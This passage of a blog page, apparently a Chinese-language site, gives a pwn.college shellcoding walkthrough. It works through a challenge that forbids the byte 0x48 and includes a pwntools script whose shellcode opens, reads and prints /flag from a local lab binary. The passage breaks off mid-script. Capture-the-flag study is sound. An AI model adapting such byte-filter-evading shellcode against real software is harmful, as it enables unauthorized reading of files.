@@ -1,0 +1,1336 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shark">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Welcome to backProgram SecurityProgram SecurityShellcoding challengesello ackers!  shellcode must be have no ‘H’ xor? ummm,no we can use 32-bits shellcode which without 0x48，ok,we can’t “mov rsi,rsp “">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college-pro sec-_Program Security">
+<meta property="og:url" content="https://ghostshark-pro.github.io/2026/04/23/pwn.college-pro%20sec-_Program%20Security/index.html">
+<meta property="og:site_name" content="shark&#39;s home">
+<meta property="og:description" content="Welcome to backProgram SecurityProgram SecurityShellcoding challengesello ackers!  shellcode must be have no ‘H’ xor? ummm,no we can use 32-bits shellcode which without 0x48，ok,we can’t “mov rsi,rsp “">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1766742435221-737fddb7-d54d-4d7f-ad1f-365b763ec346.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1766852606250-1c87facf-fbfa-47ca-8099-b9945ba6e52d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1766853222403-4ab7036e-06d5-4101-83bb-dcaae9b220c4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1766853277641-18c6145e-1672-4e91-84b5-6c288112be1b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768154778149-d031f63e-9897-417d-8a1a-d8a85bca4178.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768420380304-8bf6a90b-ea34-4b49-9223-18d40a3a22a9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768458401815-8f9db28a-35c3-4d3d-b1a7-2e7bd2951c46.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768466903974-bf584439-d493-4d95-b79f-9fbedbcba590.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768486492532-13a3e7ac-cfdb-4b95-9fbe-2f305b1fa627.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768498420237-d5d897f3-70e3-4961-9688-c79a5690b921.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768501526577-26bdc21e-80c8-4c65-9e7a-dbc034a0855f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768504095492-d30c3f3d-9ba2-4533-945b-97bf2150f3b5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768754071744-6eaa754f-3887-4a34-8742-9c6e00ebc7c5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768759270509-5d7fab55-68de-44fe-9a5b-d69e816935c6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768759288262-f381c903-f2a3-40fc-ae2e-52d2472647e6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768761361194-6296a809-5970-4d71-a213-af2cd44225ac.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768758325800-d06efa8c-7e97-4094-91d0-02f56c967a0a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768761856985-2a4cc0d7-910d-4efd-a4bc-7341aeed19dc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768761954124-66cb37e3-bf76-4909-b1e6-a64f61534117.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768762229474-7cf6267d-0530-47cb-99db-c3d40d631709.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768812336560-548c9a03-4d4d-4295-9df4-dcf0baadc277.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768812732315-e1383484-f371-451f-a8f8-414bdc0cf652.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768813905477-8ee2b378-a84d-47f4-9bf8-ae1411ac9617.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768844277442-23c98f7c-4d1d-4265-aedb-7454b0bf2a95.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768845870354-c6138678-6b68-4437-8095-a97b8abc2c2f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768845914246-5a8245a2-6812-44a9-9ed9-dced64fd53c2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1768847179328-2c72753f-8e92-4f26-bc11-d4674a3c73eb.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769069797198-9af67b1f-7728-42a0-b28c-582f423f6c80.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769072377814-755cda7e-7c54-49be-aa18-9a3220324cd4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769072429644-fc1409a5-a795-433e-abe2-fa64a3d73e75.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769073063502-1c426a15-d103-4f5d-b0cc-7ab82653c624.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769074073264-9386a28d-88f3-438b-99bb-83d8c4c0cf5b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769074171310-a150f5ee-5fb2-43b2-ab66-905e4280e53e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769081857858-7f9ffc0c-20b5-425d-aaee-ac9e57e3ea4a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769082893190-e1525dad-1a0a-461f-8f2f-c19bd3a6a8d4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769154885593-678a8679-03d5-4a2e-b1ef-79a69efcc5a2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769155003315-8f2d8ccf-52ba-4e1b-9dba-952a1290de83.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769155124658-528d87c9-d8a2-41f9-bdf3-7b2a855a79ce.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769157113444-116ec0ae-9d4b-4a59-9426-f5b6cc50a1b3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769157129135-1c66b79a-7366-46a0-af6f-d68198648680.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769159729748-357fd8b9-3846-4b7c-b4ff-2de36b156ced.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769160882059-14a00c2c-d5af-4f52-b85e-054062ed3885.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769161408093-42c97576-b3ab-4066-824c-9980b83e2ad6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769161602351-3cf4d171-458a-42ce-97bf-dfccf43c4501.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769169214881-b3afce27-fc8a-49fc-8187-971ca052ca2b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769276672262-692984bf-b217-4527-b9b0-2009132cc98a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769189118551-4dee9656-4846-42d3-8465-371964fc1a14.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769281665611-48192c97-85c4-4dd5-afd7-e54742e4fbb3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769281736369-5a8de5d4-a00a-4236-b8cf-3076944ac87e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769282493263-37a5245d-842e-40a0-a319-df134bab107e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769412052181-eef3125d-2737-484a-8125-62240c997c50.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769412135436-4b2b04b5-9f9f-4b44-ad19-e23bf3760da2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769414682033-a5a18764-7ead-40c4-8445-fd7100c21344.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769414770995-5b09b47a-3315-4695-b931-52736b46e290.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769414824684-38c11f74-c666-4d89-9a95-74906390a84b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769415669934-48dfd868-0e8a-403f-8844-d80f6e15bc46.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769416723672-97966cc3-00b4-4017-8c82-d8cd6438d5cc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769420708227-bc25a213-9933-4165-83f7-8417343e6215.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769420757715-2681e5ed-2e0b-4bbd-9152-28a8e3bc5ad5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769441799065-2ec99947-c0a0-4001-a3d9-29a0a0a8f1a7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769442823196-fae65a49-d784-4985-9cc4-177e33daf2c3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769446466232-b2b717af-7d22-408a-9f17-a693e3a79bd0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769446507885-6f5952f4-dc6f-4e5d-b159-d64169d62dd0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769446873632-32b5a170-3d28-4acf-8cbb-d60ab16d0c4e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769492947155-b9bbde02-4b60-49e6-84b3-bbeeeb490ba7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769508087898-43797f77-6e01-4068-bdb4-4873733c5525.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769508974986-e231e7c7-12cf-48f7-a5d5-58be488b9e72.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769575118687-7d92648a-0c80-4d56-a936-06ff27724290.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769575210083-7d14b63c-4a9d-46e8-a3ff-89be9c818c0c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769575734738-d5d2502c-3ebf-4cdd-8e4d-1d5cbf44ca43.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769575924438-196814e7-7b7b-4671-b37e-1416218cebd8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769576487799-1e770642-3159-4b5c-94b2-74c9c5baf5c1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769576663022-74e9d4b3-5e5d-48ca-840c-c79678a354b7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769576684064-810ac265-3833-4a96-bea1-37b3621f89e2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769576751092-e1302d55-5bed-45ff-afb4-9dc92f5378d5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769576798681-1969f9a2-01dc-4536-a3bd-0785e4fe2fe0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769577382862-c2084fa3-bddd-4ddf-8595-17b283ab86db.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769577492745-590913bd-95a2-43e0-b79e-c463651758db.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769577896341-ccb9b407-70ca-417d-a44c-946b60323d17.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769578811996-23fb7b71-62e4-4bcd-b2ec-a5dbe2c5025d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769578963632-78355870-e638-482a-91df-a4a77ef8e10c.jpeg">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769579716611-184b1ef1-6a94-4c0a-a0fd-3656e3e2448a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769579734520-9ff36e23-6fb0-4774-a1e5-bee07af2b255.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769580120707-2028c2ee-dbbb-4560-9736-91e64ff3887e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769580513536-755b0465-7dfc-4c1e-8e27-095299d5d580.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769594752865-881204e5-af1c-48b1-9198-822526749bf9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769606310045-09af06f3-197d-412c-9725-5a05dd7b72c4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769606496243-a56a0a3c-b0a0-4d3a-be3b-41186f834105.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1769606632414-24e57fe6-2534-4dae-ab99-a22d31d2cabf.png">
+<meta property="article:published_time" content="2026-04-23T12:56:12.000Z">
+<meta property="article:modified_time" content="2026-04-23T13:26:50.735Z">
+<meta property="article:author" content="shark">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Program-Security/1766742435221-737fddb7-d54d-4d7f-ad1f-365b763ec346.png">
+  
+  
+  
+  <title>pwn.college-pro sec-_Program Security - shark&#39;s home</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ghostshark-pro.github.io","root":"/","version":"1.9.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#00FFFF","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>shark&#39;s home</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Terminal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Arsenal</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Timeline</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Friends</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>Whoami</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>Terminal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>Arsenal</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>Tags</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>Timeline</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/links/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-link-fill"></i>
+                  <span>Friends</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>Whoami</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>Grep</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="Light Mode"
+               data-label-dark="Dark Mode">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">Dark Mode</span>
+              </div>
+            </a>
+          </div>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pwn.college-pro sec-_Program Security"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-23 20:56" pubdate>
+          2026年4月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          21k bytes
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          ETA: 178 min
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">pwn.college-pro sec-_Program Security</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Welcome-to-back"><a href="#Welcome-to-back" class="headerlink" title="Welcome to back"></a><em><font style="color:#81DFE4;">Welcome to back</font></em></h1><h2 id="Program-Security"><a href="#Program-Security" class="headerlink" title="Program Security"></a>Program Security</h2><h3 id="Program-Security-1"><a href="#Program-Security-1" class="headerlink" title="Program Security"></a><font style="color:#2F8EF4;background-color:#FFFFFF;">Program Security</font></h3><h4 id="Shellcoding-challenges"><a href="#Shellcoding-challenges" class="headerlink" title="Shellcoding challenges"></a><font style="color:rgb(120, 190, 32);background-color:rgb(16, 16, 16);">Shellcoding challenges</font></h4><h5 id="ello-ackers"><a href="#ello-ackers" class="headerlink" title="ello ackers!"></a><font style="color:#2F8EF4;">ello ackers!</font></h5><!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/pwn.college-pro-sec-_Program-Security/1766742435221-737fddb7-d54d-4d7f-ad1f-365b763ec346.png" srcset="/img/loading.gif" lazyload></p>
+<p>shellcode must be have no ‘H’</p>
+<p>xor? ummm,no</p>
+<p>we can use 32-bits shellcode which without 0x48，ok,we can’t</p>
+<p>“mov rsi,rsp “ have 0x48</p>
+<p>mov rsi , rsp &#x3D;</p>
+<p>push rsp</p>
+<p>pop rsi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs plain">import os<br>os.environ[&#x27;PATH&#x27;] = &#x27;/usr/bin:/bin&#x27;<br>os.environ[&#x27;PWNLIB_NOTERM&#x27;] = &#x27;1&#x27;<br>from pwn import *<br><br>context.binary = &#x27;/challenge/ello-ackers&#x27;<br><br><br>p = process(&#x27;/challenge/ello-ackers&#x27;)<br><br>shellcode = asm(&#x27;&#x27;&#x27;<br>xor eax, eax<br>push rax<br>mov dword ptr [rsp], 0x616c662f<br>mov byte  ptr [rsp+4], 0x00000067   <br>push rsp<br>pop rdi    <br><br>xor esi, esi<br>xor edx, edx<br>mov eax, 2<br>syscall            <br><br>mov edi, eax       <br>push rsp<br>pop  rsi          <br>mov edx, 0x100<br>xor eax, eax<br>syscall            <br><br>mov edx, eax<br>mov edi, 1<br>push rsp<br>pop  rsi<br>mov eax, 1<br>syscall           <br><br>mov eax, 60<br>xor edi, edi<br>syscall<br>&#x27;&#x27;&#x27;)<br><br>print(shellcode.hex())<br><br><br>#shellcode = bytes.fromhex(shellcode_hex)<br><br>p.recvuntil(b&#x27;Reading 0x1000 bytes from stdin.&#x27;)<br>p.send(shellcode)<br><br>out =b&#x27;&#x27;<br>out += p.recv(timeout=2)<br>    #if b&#x27;pwn&#x27; in out :<br>        #break<br>    